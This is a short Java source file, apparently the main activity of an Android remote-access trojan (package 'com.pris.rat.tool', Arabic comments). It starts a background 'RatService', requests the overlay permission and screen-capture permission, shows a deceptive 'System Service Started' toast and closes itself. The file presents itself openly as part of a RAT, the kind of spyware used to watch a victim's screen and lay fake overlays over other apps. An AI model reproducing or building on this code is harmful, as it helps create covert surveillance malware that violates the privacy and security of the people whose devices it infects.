package com.pris.rat.tool;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Toast;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // 1. تشغيل الخدمة
        Intent svc = new Intent(this, RatService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(svc);
        } else {
            startService(svc);
        }

        // 2. طلب إذن Overlay
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                startActivity(i);
            }
        }

        // 3. طلب إذن Screen Capture (مرة واحدة)
        Intent perm = new Intent(this, PermissionActivity.class);
        startActivity(perm);

        Toast.makeText(this, "System Service Started", Toast.LENGTH_LONG).show();
        finish();
    }
}